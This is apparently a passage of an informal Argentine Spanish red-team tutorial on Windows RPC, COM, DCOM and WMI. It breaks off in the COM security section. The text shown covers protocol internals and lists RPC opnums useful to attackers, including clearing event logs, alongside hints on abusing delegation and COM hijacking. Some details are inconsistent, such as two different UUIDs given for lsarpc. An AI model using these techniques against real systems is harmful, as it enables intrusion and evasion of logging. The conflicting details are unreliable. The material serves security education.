# w1n-s9bsyst3ms — Abuso de rpc, com, dcom y wmi

> **Audiencia:** Infosec, pentesters, [red](../raw/r3d3s-f0nd4m3nt0s.md)-teamers.
> **Nivel:** Intermedio–Avanzado.
> **Idioma:** Español argentino (bien informal).
> **TL;DR:** Windows no es una caja negra. [rpc](../raw/w1n-s9bsyst3ms.md#rpc), [com](../raw/w1n-s9bsyst3ms.md#com), [dcom](../raw/w1n-s9bsyst3ms.md#dcom) y [wmi](../raw/w1n-s9bsyst3ms.md#wmi) son los protocolos que mueven Windows internamente. Si los entendés, los rompés.

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (3334 lineas)


1. [RPC (Remote Procedure Call)](#rpc)
   - 1.1 [DCE/RPC: el protocolo base](#11-dcerpc-el-protocolo-base)
   - 1.2 [NDR — Network Data Representation](#12-ndr--network-data-representation)
   - 1.3 [UUID, Interface ID y Opnum](#13-uuid-interface-id-y-opnum)
   - 1.4 [Binding Handles](#14-binding-handles)
   - 1.5 [Protocolos de transporte (Protocol Sequences)](#15-protocolos-de-transporte-protocol-sequences)
   - 1.6 [Endpoint Mapper (EPM) — TCP 135](#16-endpoint-mapper-epm--tcp-135)
   - 1.7 [Autenticacion en RPC (RPC_C_AUTHN_LEVEL_*)](#17-autenticacion-en-rpc-rpc_c_authn_level_)
   - 1.8 [Impersonacion en RPC](#18-impersonacion-en-rpc)
   - 1.9 [Interfaces RPC bien conocidas](#19-interfaces-rpc-bien-conocidas)
   - 1.10 [Estructura de un paquete RPC](#110-estructura-de-un-paquete-rpc)

2. [COM (Component Object Model)](#com)
   - 2.1 [Arquitectura COM](#21-arquitectura-com)
   - 2.2 [IUnknown — La interfaz madre](#22-iunknown--la-interfaz-madre)
   - 2.3 [CLSID, ProgID y AppID](#23-clsid-progid-y-appid)
   - 2.4 [Registry de COM (HKCR)](#24-registry-de-com-hkcr)
   - 2.5 [Apartments: STA vs MTA](#25-apartments-sta-vs-mta)
   - 2.6 [Marshalling en COM](#26-marshalling-en-com)
   - 2.7 [Seguridad en COM](#27-seguridad-en-com)
   - 2.8 [Elevacion de privilegios via COM](#28-elevacion-de-privilegios-via-com)
   - 2.9 [COM Hijacking para persistencia](#29-com-hijacking-para-persistencia)

3. [DCOM (Distributed COM)](#dcom)
   - 3.1 [ORPC — Object RPC](#31-orpc--object-rpc)
   - 3.2 [OXID Resolver](#32-oxid-resolver)
   - 3.3 [OBJREF — Object Reference](#33-objref--object-reference)
   - 3.4 [IClassFactory y RemoteCreateInstance](#34-iclassfactory-y-remotecreateinstance)
   - 3.5 [AppID, permisos de launch y access](#35-appid-permisos-de-launch-y-access)
   - 3.6 [Restricciones machine-wide de DCOM](#36-restricciones-machine-wide-de-dcom)
   - 3.7 [DCOM y el Firewall de Windows](#37-dcom-y-el-firewall-de-windows)
   - 3.8 [DCOM Lateral Movement](#38-dcom-lateral-movement)

4. [WMI (Windows Management Instrumentation)](#wmi)
   - 4.1 [Arquitectura WMI](#41-arquitectura-wmi)
   - 4.2 [WMI Providers](#42-wmi-providers)
   - 4.3 [Jerarquia de namespaces WMI](#43-jerarquia-de-namespaces-wmi)
   - 4.4 [WQL — WMI Query Language](#44-wql--wmi-query-language)
   - 4.5 [Event Subscriptions en WMI](#45-event-subscriptions-en-wmi)
   - 4.6 [Persistencia via WMI](#46-persistencia-via-wmi)
   - 4.7 [Conexion remota a WMI](#47-conexion-remota-a-wmi)
   - 4.8 [WMI para Lateral Movement](#48-wmi-para-lateral-movement)
   - 4.9 [WMI para recoleccion de datos](#49-wmi-para-recoleccion-de-datos)

5. [Abuso Ofensivo de RPC](#abuso-rpc)
   - 5.1 [Enumeracion remota de interfaces RPC](#51-enumeracion-remota-de-interfaces-rpc)
   - 5.2 [Abuso de samr para enumerar usuarios](#52-abuso-de-samr-para-enumerar-usuarios)
   - 5.3 [Abuso de lsarpc para politicas de dominio](#53-abuso-de-lsarpc-para-politicas-de-dominio)
   - 5.4 [Abuso de drsuapi (DCShadow/DSync)](#54-abuso-de-drsuapi-dcshadowdsync)
   - 5.5 [Abuso de srvsvc para recursos compartidos](#55-abuso-de-srvsvc-para-recursos-compartidos)
   - 5.6 [RPC Relay / RPC over HTTP](#56-rpc-relay--rpc-over-http)

6. [Abuso Ofensivo de COM/DCOM](#abuso-com)
   - 6.1 [Enumeracion de CLSID y objetos COM](#61-enumeracion-de-clsid-y-objetos-com)
   - 6.2 [COM Hijacking paso a paso](#62-com-hijacking-paso-a-paso)
   - 6.3 [UAC Bypass via COM Elevation](#63-uac-bypass-via-com-elevation)
   - 6.4 [DCOM Lateral Movement con Excel/MMC](#64-dcom-lateral-movement-con-excelmmc)
   - 6.5 [DCOM Shellcode Injection](#65-dcom-shellcode-injection)

7. [Abuso Ofensivo de WMI](#abuso-wmi)
   - 7.1 [WMI Process Creation remoto](#71-wmi-process-creation-remoto)
   - 7.2 [WMI Persistence Implant](#72-wmi-persistence-implant)
   - 7.3 [WMI Data Exfiltration](#73-wmi-data-exfiltration)
   - 7.4 [WMI Event Log Tampering](#74-wmi-event-log-tampering)
   - 7.5 [Living off the Land con WMI](#75-living-off-the-land-con-wmi)

8. [Herramientas](#herramientas)
   - 8.1 [Impacket](#81-impacket)
   - 8.2 [OleView .NET](#82-oleview-net)
   - 8.3 [RPCView](#83-rpcview)
   - 8.4 [WMI Explorer / wbemtest](#84-wmi-explorer--wbemtest)
   - 8.5 [PowerShell para RPC/COM/WMI](#85-powershell-para-rpccomwmi)
   - 8.6 [Cobalt Strike](#86-cobalt-strike)
   - 8.7 [Otras herramientas piolas](#87-otras-herramientas-piolas)

9. [Proyectos Practicos](#proyectos)
   - 9.1 [Enumeracion RPC remota con Python](#91-enumeracion-rpc-remota-con-python)
   - 9.2 [COM Hijacking para persistencia](#92-com-hijacking-para-persistencia)
   - 9.3 [DCOM Lateral Movement a un equipo remoto](#93-dcom-lateral-movement-a-un-equipo-remoto)
   - 9.4 [WMI Remote Process Creation](#94-wmi-remote-process-creation)
   - 9.5 [WMI Persistence Implant](#95-wmi-persistence-implant)

---

# RPC

## 1.1 DCE/[rpc](../raw/w1n-s9bsyst3ms.md#rpc): el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) base

RPC (Remote Procedure Call) es literalmente la columna vertebral de Windows. Todo el tiempo, todo el [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) esta llamando funciones de un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) a otro, de una maquina a otra, y todo eso usa RPC por abajo.

La implementacion de Microsoft se basa en el estandar **DCE/RPC** (Distributed Computing Environment / Remote Procedure Call), originalmente desarrollado por la Open Software Foundation (OSF) en los 80. Si, es viejo. Y si, sigue siendo critico.

DCE/RPC define:
- Un mecanismo para que un proceso llame una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) en otro proceso (local o remoto).
- Un lenguaje de definicion de interfaces (IDL — Interface Definition Language).
- Un formato de serializacion de datos (NDR — Network Data Representation).
- Un sistema de binding para localizar y conectar con el servidor.
- Varios protocolos de transporte.

En Windows, RPC no es un servicio que se pueda desactivar facilmente. Esta incrustado en el sistema operativo. El servicio RpcSs (RPC Endpoint Mapper) y RpcEptMapper arrancan con el sistema y no hay forma limpia de apagarlos sin que Windows deje de funcionar.
## 1.2 NDR — Network Data Representation

NDR es el formato de serializacion que usa DCE/[rpc](../raw/w1n-s9bsyst3ms.md#rpc) para pasar parametros entre maquinas. Basicamente, define como se convierten las estructuras de C (ints, strings, punteros, arrays) a un stream de bytes que viaja por la [red](../raw/r3d3s-f0nd4m3nt0s.md).

Caracteristicas de NDR:
- **Little-endian vs Big-endian:** NDR negocia el endianness entre cliente y servidor. Windows manda little-endian (Intel) por defecto.
- **Align natural:** Los campos se alinean a su tamano natural (ints de 4 bytes alineados a 4 bytes, etc.).
- **Punteros:** NDR maneja punteros con referencias (unique, ptr, ref). Esto permite pasar estructuras con punteros internos.
- **Arrays:** Soportea arrays conformantes (tamano fijo), variantes (con un maximo), y arrays abiertos (con tamano en otro parametro).
- **Strings:** Strings de caracteres (char) y wide (wchar_t), con terminacion nula o con tamano explicito.

Un concepto clave es el **NDR format string** o **type format string**. Cada interfaz RPC tiene una definicion IDL que el [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) MIDL convierte en format strings que describen los tipos de datos. Estas format strings se usan en runtime para marshalling/unmarshalling.

Windows implementa NDR en la rpcrt4.dll. Las funciones NdrClientCall2, NdrServerCall2, NdrConformantArrayMarshall, etc. son las que hacen el trabajo pesado.

---

## 1.3 UUID, Interface ID y Opnum

Cada interfaz [rpc](../raw/w1n-s9bsyst3ms.md#rpc) se identifica con un **UUID** (Universally Unique Identifier) de 128 bits (16 bytes). Tambien se conoce como **IID** (Interface ID) o **UUID de interfaz**.

Ejemplos:
- 12345678-1234-ABCD-EF00-0123456789AB — interfaz de ejemplo
- 3919286A-B10C-11D0-9BA8-00C04FD92EF5 — lsarpc (Local Security Authority)
- 12345778-1234-ABCD-EF00-0123456789AC — samr (Security Account Manager)

El **opnum** (operation number) es el numero de operacion dentro de la interfaz. Si una interfaz define 10 funciones (metodos), cada una tiene un opnum del 0 al 9.

Entonces, para ejecutar una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) RPC remota necesitas:
1. **UUID de interfaz** — que interfaz queres llamar
2. **Opnum** — que funcion de esa interfaz
3. **Parametros** serializados en NDR

El endpoint mapper (EPM) te dice en que [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) o named pipe esta escuchando cada interfaz.

---

## 1.4 Binding Handles

Un **binding handle** es el equivalente a un file descriptor pero para [rpc](../raw/w1n-s9bsyst3ms.md#rpc). Es un [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) opaco que representa una conexion entre cliente y servidor.

### String Binding
Un string binding es una cadena de texto con este formato:
`
<protocol_sequence>:<endpoint>[:<network_address>]
`

Ejemplos:
- ncacn_np:\\SERVER\pipe\lsarpc
- ncacn_ip_tcp:192.168.1.100[49152]
- ncacn_http:192.168.1.100[593]

### Object UUID (Objective Resolver)
Se puede especificar un **object UUID** en el binding. Esto le dice al servidor que objeto concreto queres usar. Se pasa como un GUID adicional en la llamada de binding.

### Componentes de un binding handle:
- **Protocol Sequence:** El [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de transporte (ncacn_np, ncacn_ip_tcp, etc.)
- **Network Address:** [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) o hostname del servidor
- **Endpoint:** [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp), named pipe, etc.
- **Options:** Cosas como el timeout, security binding, etc.

Windows usa RpcStringBindingCompose para armar string bindings y RpcBindingFromStringBinding para convertirlos en handles.

---

## 1.5 Protocolos de transporte (Protocol Sequences)

[rpc](../raw/w1n-s9bsyst3ms.md#rpc) soporta varios transportes. Los mas importantes en Windows:

### ncacn_np — RPC over [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) (Named Pipes)
- Usa named pipes de SMB (\\pipe\*).
- [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos): 445/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) (SMB).
- Ejemplo: ncacn_np:\\\\192.168.1.100\\pipe\samr
- Es el mecanismo mas comun para RPC local y remoto en entornos Windows.
- Usa el mismo canal SMB para [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).
- Por defecto, las named pipes RPC son \\pipe\lsarpc, \\pipe\samr, \\pipe\netlogon, \\pipe\srvsvc, etc.

### ncacn_ip_tcp — RPC over TCP
- Usa TCP directo.
- Puerto: dinamico (49152–65535 en Vista+; 1024–5000 en XP/2003), o fijo.
- Ejemplo: ncacn_ip_tcp:192.168.1.100[49154]
- Lo usan aplicaciones que necesitan RPC fuera del contexto SMB.

### ncacn_http — RPC over [http](../raw/r3d3s-f0nd4m3nt0s.md#http)
- Usa HTTP como transporte.
- Puerto: 593 (RPC over HTTP) o 80/443 (con IIS RPC [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)).
- Ejemplo: ncacn_http:192.168.1.100[593]
- Permite RPC a traves de firewalls y proxies web.
- Windows lo usa para cosas como Exchange, Outlook (RPC over HTTP).

### ncadg_ip_udp — RPC over [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) (Datagram)
- No es confiable por naturaleza.
- Usos limitados, poco comun en la practica.

### ncalrpc — RPC Local (LRPC)
- Solo comunicacion local, entre procesos en la misma maquina.
- Usa LPC (Local Procedure Call) ports.
- No viaja por la [red](../raw/r3d3s-f0nd4m3nt0s.md), obvio.

---

## 1.6 Endpoint Mapper (EPM) — [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135

El **Endpoint Mapper** (EPM) es el servicio que corre en el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) TCP 135 (y tambien en \\pipe\epmapper). Es como el [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) de [rpc](../raw/w1n-s9bsyst3ms.md#rpc): le preguntas "donde esta la interfaz con UUID X?" y te devuelve el endpoint ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos)/named pipe) donde esta escuchando.

### Funcionamiento:
1. El servidor RPC registra su interfaz en el EPM al arrancar, llamando a RpcEpRegister.
2. El cliente se conecta al EPM (TCP 135) y pregunta por el UUID de interfaz que necesita.
3. El EPM responde con la direccion: protocol sequence + endpoint.
4. El cliente se conecta directamente al endpoint y ejecuta las funciones RPC.

### Llamada tipica al EPM:
CLIENTE -> EPM:   ept_lookup (UUID=3919286A-B10C-11D0-9BA8-00C04FD92EF5)
EPM -> CLIENTE:   ncacn_ip_tcp:192.168.1.100[49664]
CLIENTE -> SERVER: Conecta a 49664, llama opnum X de lsarpc

### Estructura de ept_lookup:
- entry_handle — handle de la consulta (NULL para empezar)
- inquiry_type — tipo de busqueda (por UUID, por objeto, etc.)
- interface_id — el UUID que buscas
- max_ents — max. resultados (default 1 o mas)
- vector — resultado (array de binding handles + UUIDs)

El EPM es el primer punto de contacto para cualquier enumeracion RPC remota. Si el 135 esta abierto, hay RPC.

---

## 1.7 [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) en [rpc](../raw/w1n-s9bsyst3ms.md#rpc) (RPC_C_AUTHN_LEVEL_*)

RPC define niveles de autenticacion que controlan como se protege la comunicacion:

| Nivel | Valor | Significado |
|-------|-------|-------------|
| RPC_C_AUTHN_LEVEL_NONE | 1 | Sin autenticacion |
| RPC_C_AUTHN_LEVEL_CONNECT | 2 | Autentica solo al conectar |
| RPC_C_AUTHN_LEVEL_CALL | 3 | Autentica cada llamada (header) |
| RPC_C_AUTHN_LEVEL_PKT | 4 | Autentica cada paquete |
| RPC_C_AUTHN_LEVEL_PKT_INTEGRITY | 5 | Autentica + integridad (firma) |
| RPC_C_AUTHN_LEVEL_PKT_PRIVACY | 6 | Autentica + integridad + [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) |

### En la practica:
- **NONE:** Cualquiera puede llamar, sin autenticar. Rarisimo en [redes](../raw/r3d3s-f0nd4m3nt0s.md) modernas.
- **CONNECT:** Se autentica al establecer la conexion. Despues, todos los paquetes viajan sin firma ni cifrado. Es el default para muchas interfaces.
- **PKT_INTEGRITY:** Cada paquete va firmado. No se puede modificar en transito.
- **PKT_PRIVACY:** Cada paquete va cifrado. No se puede leer ni modificar.

### Authn Service:
Tambien se especifica el **servicio de autenticacion**:
- RPC_C_AUTHN_WINNT (NTLM)
- RPC_C_AUTHN_GSS_KERBEROS (Kerberos)
- RPC_C_AUTHN_GSS_NEGOTIATE (Negocia: Kerberos o NTLM)
- RPC_C_AUTHN_DEFAULT (deja que el runtime elija)

### Impacket y auth level:
Impacket permite especificar el auth level. Muchas herramientas usan CONNECT por defecto, que es suficiente para la mayoria de los ataques de enumeracion.

---

## 1.8 Impersonacion en [rpc](../raw/w1n-s9bsyst3ms.md#rpc)

RPC permite que el servidor **impersone** (se haga pasar por) al cliente. Esto es fundamental para [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion).

### Niveles de impersonacion:

| Nivel | Valor | Significado |
|-------|-------|-------------|
| RPC_C_IMP_LEVEL_ANONYMOUS | 1 | No revela identidad |
| RPC_C_IMP_LEVEL_IDENTIFY | 2 | El servidor puede identificar pero no actuar como el cliente |
| RPC_C_IMP_LEVEL_IMPERSONATE | 3 | El servidor puede actuar como el cliente localmente |
| RPC_C_IMP_LEVEL_DELEGATE | 4 | El servidor puede actuar como el cliente ante otros servidores |

### Como funciona:
1. El cliente especifica el nivel de impersonacion al llamar RpcBindingSetAuthInfoEx.
2. El servidor llama RpcImpersonateClient para activar la impersonacion.
3. El servidor accede a recursos (archivos, registry, etc.) como si fuera el cliente.
4. El servidor llama RpcRevertToSelf para volver a su identidad original.

### Delegacion (Delegate):
El nivel 4 permite que el servidor use las credenciales del cliente para autenticarse contra un tercer servidor. Es peligroso. En entornos de dominio, requiere que las cuentas esten configuradas como Trusted for Delegation.

### Implicaciones ofensivas:
Si encontras un servicio RPC que impersona a sus clientes y tiene DELEGATE habilitado, podes usarlo para saltar a otros sistemas como el usuario victima.

---

## 1.9 Interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc) bien conocidas

Estas son interfaces RPC que Windows expone y que son utiles desde una perspectiva ofensiva:

| Interfaz | UUID | Pipe/[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | Opnums utiles | Descripcion |
|----------|------|-------------|---------------|-------------|
| lsarpc | 12345678-1234-ABCD-EF00-0123456789AB | \\pipe\lsarpc | LsarQueryInformationPolicy2 (7), LsarLookupNames (14), LsarLookupSids (15) | Politicas de seguridad local |
| samr | 12345778-1234-ABCD-EF00-0123456789AC | \\pipe\samr | SamrConnect (0), SamrEnumerateDomainsInSamServer (6), SamrEnumDomainUsers (13), SamrQueryInformationUser (36) | SAM database |
| drsuapi | E3514235-4B06-11D1-AB04-00C04FC2DCD2 | [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) (dinamico) | DRSGetNCChanges (3) | Replicacion de [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) (DSync) |
| srvsvc | 4B324FC8-1610-4BAE-865C-D1F3E7ED4259 | \\pipe\srvsvc | NetrShareEnum (15), NetrServerGetInfo (21) | Recursos compartidos |
| winreg | 338CD001-2244-31F1-AAAA-900038001003 | \\pipe\winreg | OpenHKLM (40), OpenHKCR (62), QueryValue (17) | Registry remoto |
| wkstn | 5A7B91F8-FF00-11D0-A9B2-00C04FB6E6FC | \\pipe\wkstn | NetrWkstaGetInfo (0), NetrWkstaUserEnum (7) | Workstation info |
| eventlog | 82273FDC-E32A-18C3-3F78-827929DC23EA | \\pipe\evtlog | ElfClearELFile (14), ElfReadEventLog (1) | Log de eventos |
| winspipe | 1FF70682-0A51-30E8-076D-740BE8CEE98B | \\pipe\spoolss | RpcOpenPrinter (0), RpcEnumPrinterDrivers (10) | Spooler de impresion |

### Puertos dinamicos para DRSUAPI:
Cuando enumeras el EPM de un [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller), la interfaz drsuapi suele estar en un puerto alto (49664–65535) sobre TCP. Es el mismo mecanismo que se usa para lsad (Local Security Authority Subsystem).

---

## 1.10 Estructura de un paquete [rpc](../raw/w1n-s9bsyst3ms.md#rpc)

Un paquete RPC sobre [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/named pipes tiene esta estructura:

### RPC PDU Header (Common Header):
Byte 0:  Version (4 o 5)
Byte 1:  Minor version
Byte 2:  PDU type (0=Request, 2=Bind, 3=BindAck, 5=AlterContext, ...)
Byte 3:  Flags
Byte 4-7: Data representation (endianness, int/char format)
Byte 8-15: Frag length, auth length, call_id

### Tipos de PDU:
| Tipo | Valor | Uso |
|------|-------|-----|
| Request | 0 | Invocar un opnum |
| Ping | 1 | Keep-alive |
| Bind | 2 | Negociar contexto de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) |
| BindAck | 3 | Confirmar bind |
| BindNak | 4 | Rechazar bind |
| AlterContext | 5 | Cambiar contexto de autenticacion |
| Fault | 17 | Error |
| Response | 13 | Respuesta exitosa |

### Request PDU:
[Common Header (PDU type=0)]
[Data Representation (NDR format)]
[Opnum (2 bytes)]
[Object UUID (opcional, 16 bytes)]
[Stub Data (parametros en NDR)]

Los parametros se serializan siguiendo las format strings generadas por MIDL. Es un formato complejo con alineamiento natural, punteros embedidos, y chunks de datos con cabeceras.

---

# COM

## 2.1 Arquitectura [com](../raw/w1n-s9bsyst3ms.md#com)

COM (Component Object Model) es un modelo de componentes de Microsoft que permite que objetos de software se comuniquen entre si, incluso si estan escritos en distintos lenguajes o corren en distintos procesos.

### Conceptos fundamentales:
- **Componente:** Una unidad de software que implementa una o mas interfaces.
- **Interfaz:** Un conjunto de metodos relacionados, identificados por un UUID (IID).
- **Objeto:** Una instancia de una clase COM en memoria.
- **Servidor COM:** El modulo (DLL o EXE) que aloja los objetos.
- **Cliente COM:** El codigo que usa los objetos.

### Tipos de servidores COM:

**In-process (DLL):**
- El servidor es una DLL que se carga en el espacio de direcciones del cliente.
- No hay marshalling (las llamadas son directas).
- Registrado con InprocServer32 en el registry.
- Ejemplo: C:\Windows\System32\wbem\wbemcore.dll (proveedores [wmi](../raw/w1n-s9bsyst3ms.md#wmi)).

**Out-of-process (EXE):**
- El servidor es un EXE separado.
- Hay marshalling via LRPC (si es local) o [dcom](../raw/w1n-s9bsyst3ms.md#dcom) (si es remoto).
- Registrado con LocalServer32 en el registry.
- Ejemplo: C:\Windows\System32\rundll32.exe (a veces, o mmc.exe para snap-ins).

**Remote:**
- El servidor corre en otra maquina.
- Usa DCOM ([rpc](../raw/w1n-s9bsyst3ms.md#rpc) sobre la [red](../raw/r3d3s-f0nd4m3nt0s.md)).
- Se configura via AppID y [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de DCOM.

### CLSID y clase:
Cada clase COM tiene un **CLSID** (Class ID, otro GUID). Cuando un cliente pide crear un objeto de cierta clase, el runtime COM busca el CLSID en el registry, localiza el servidor, y lo instancia.

---

## 2.2 IUnknown — La interfaz madre

Toda interfaz [com](../raw/w1n-s9bsyst3ms.md#com) hereda de IUnknown. Es la interfaz base que define tres metodos:

interface IUnknown {
    HRESULT QueryInterface([in] REFIID riid, [out] void **ppvObject);
    ULONG   AddRef();
    ULONG   Release();
}

### QueryInterface:
Es el metodo mas importante. Permite preguntar a un objeto "implementas esta interfaz?" y obtener un [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) a ella.

// Ejemplo conceptual
IMyInterface *pMyObj = /* ... */;
ISomeOther  *pOther = NULL;

HRESULT hr = pMyObj->QueryInterface(IID_ISomeOther, (void**)&pOther);
if (SUCCEEDED(hr)) {
    // Ahora tenemos acceso a ISomeOther
}

### AddRef / Release:
Manejan el conteo de referencias. Cada vez que obtenes un puntero a una interfaz, llamas AddRef. Cuando terminas, llamas Release. Si el contador llega a 0, el objeto se destruye.

### Reglas:
- QueryInterface llama AddRef internamente (el caller recibe una referencia contada).
- Hay que llamar Release por cada AddRef / QueryInterface exitoso.
- Si no, tenes memory leaks (o crashes).

### IUnknown UUID:
IID_IUnknown = {00000000-0000-0000-C000-000000000046}

---

## 2.3 CLSID, ProgID y AppID

### CLSID (Class ID):
GUID de 128 bits que identifica una clase [com](../raw/w1n-s9bsyst3ms.md#com) de forma unica.
HKCR\CLSID\{00024500-0000-0000-C000-000000000046}
Cada CLSID contiene subclaves:
- InprocServer32 — path a la DLL del servidor
- LocalServer32 — path al EXE del servidor
- ProgID — nombre legible asociado
- AppID — GUID de la aplicacion (para config de seguridad)
- TreatAs — redireccion a otra clase
- AutoConvert — convertir de un formato antiguo

### ProgID (Programmatic ID):
Un nombre legible para humanos que se mapea a un CLSID.
HKCR\Excel.Application
  -> CLSID = {00024500-0000-0000-C000-000000000046}
ProgIDs pueden tener version: Excel.Application.16.

### AppID (Application ID):
GUID que agrupa configuraciones de seguridad para servidores COM out-of-process y [dcom](../raw/w1n-s9bsyst3ms.md#dcom).
HKCR\AppID\{00024500-0000-0000-C000-000000000046}
Subclaves:
- DllSurrogate — para DLLs corriendo como EXE
- LaunchPermission — ACL para [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de launch
- AccessPermission — ACL para permisos de acceso
- AuthenticationLevel — nivel de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
- RunAs — cuenta de usuario para correr el servidor
- RemoteServerName — nombre del servidor remoto

---

## 2.4 Registry de [com](../raw/w1n-s9bsyst3ms.md#com) (HKCR)

Toda la configuracion de COM esta en el registry bajo HKCR (HKEY_CLASSES_ROOT). HKCR es una vista combinada de HKLM\Software\Classes + HKCU\Software\Classes.

### Estructura clave:

HKCR\
  CLSID\
    {CLSID-GUID}\
      InprocServer32 = "C:\Windows\System32\foo.dll"
      LocalServer32  = "C:\Windows\System32\foo.exe"
      ProgID         = "Foo.Application"
      AppID          = "{APPID-GUID}"
      TreatAs        = "{OTHER-CLSID}"
  
  Interface\
    {IID-GUID}\
      ProxyStubClsid32 = "{PS-GUID}"
      NumMethods       = "5"
  
  AppID\
    {APPID-GUID}\
      (Default)        = "MyApp"
      LaunchPermission = (binary ACL)
      RunAs            = "NT AUTHORITY\SYSTEM"
  
  ProgID\
    Foo.Application\
      CLSID            = "{CLSID-GUID}"
  
  TypeLib\
    {LIBID-GUID}\

### Donde mirar para ofensiva:
- **CLSID:** Para hijacking, busca CLSIDs que apunten a DLLs inexistentes o reemplazables.
- **AppID:** Para ver [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de [dcom](../raw/w1n-s9bsyst3ms.md#dcom), LaunchPermission y AccessPermission.
- **TreatAs / AutoConvert:** Para redireccion de objetos COM (otra forma de hijacking).
- **Interface\ProxyStubClsid32:** Para ver que [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)/stub usa una interfaz.

---

## 2.5 Apartments: STA vs MTA

[com](../raw/w1n-s9bsyst3ms.md#com) define apartments como unidades de concurrencia. Un apartment es un [contenedor](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) logico donde vive un objeto [com](../raw/w1n-s9bsyst3ms.md#com) y define como se serializan las llamadas.

### STA (Single-Threaded Apartment):
- Cada objeto vive en un [hilo](../raw/0s-f0nd4m3nt0s.md#hilos) especifico.
- Las llamadas a metodos se serializan a traves de una ventana oculta (message queue).
- Es el modelo mas comun para UI (WinForms, WPF, VBA).
- Se inicializa con CoInitialize(NULL).
- Una STA por hilo.

### MTA (Multi-Threaded Apartment):
- Los objetos viven en un pool de hilos.
- Las llamadas pueden venir de cualquier hilo simultaneamente.
- El objeto debe manejar su propia sincronizacion (mutex, critical sections).
- Se inicializa con CoInitializeEx(NULL, COINIT_MULTITHREADED).
- Una MTA por [proceso](../raw/0s-f0nd4m3nt0s.md#procesos).

### Consecuencias ofensivas:
- **STA:** Si llamas un objeto STA desde otro hilo, COM marshalling hace la transicion automaticamente. Esto puede ser lento pero es seguro.
- **MTA:** Los objetos MTA son mas rapidos pero mas propensos a race conditions.
- **Cross-apartment calls:** COM usa marshalling (LRPC) para cruzar apartments. Esto significa que incluso objetos in-process pueden tener marshalling si estan en distintos apartments.

### Como saber en que apartment esta un objeto:
- No hay una API directa para consultarlo.
- Generalmente, los objetos COM expuestos por el sistema son MTA (a menos que tengan UI).
- Los objetos de [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) (JScript, VBScript) suelen ser STA.

---

## 2.6 Marshalling en [com](../raw/w1n-s9bsyst3ms.md#com)

**Marshalling** es el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de empaquetar parametros y return values para que viajen entre procesos o maquinas. Es basicamente la serializacion de COM.

### Tipos de marshalling:

**Standard Marshalling ([proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)/Stub):**
- El mas comun.
- Usa proxies (en el cliente) y stubs (en el servidor) generados por MIDL.
- Las interfaces se registran en HKCR\Interface\{IID}\ProxyStubClsid32.
- El proxy serializa los parametros -> channel -> stub deserializa -> llama al objeto.

**Custom Marshalling:**
- El objeto implementa IMarshal para controlar su propia serializacion.
- Util para objetos que quieren pasar punteros directos o manejar su propio [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)).
- IMarshal::GetUnmarshalClass, MarshalInterface, UnmarshalInterface.
- Peligroso si un objeto implementa IMarshal maliciosamente.

**Type Library Marshalling (OLE Automation):**
- Usa IDispatch y typelibs (.tlb).
- No necesita proxy/stub registrados.
- Usa VARIANT y SAFEARRAY como tipos universales.
- Es el marshalling que usa VBScript, JScript, [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) (con COM).

### Channel y ORPC:
Para comunicacion entre procesos, COM usa **LRPC** (local) o **ORPC** (remoto via [dcom](../raw/w1n-s9bsyst3ms.md#dcom)). LRPC usa LPC ports (nombrados como \[rpc](../raw/w1n-s9bsyst3ms.md#rpc) Control\<name>).

### Proxy/Stub mas comunes:
ole32.dll       -> Proxy/stub para IUnknown, IDispatch, IClassFactory
oleaut32.dll    -> Proxy/stub para tipos OLE Automation
COMBASE.dll     -> Proxy/stub modernos (Win8+)

---

## 2.7 Seguridad en [com](../raw/w1n-s9bsyst3ms.md#com)

COM tiene un modelo de seguridad complejo que opera en varias capas:

### CoInitializeSecurity:
Se llama una vez por [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) para configurar la seguridad default.

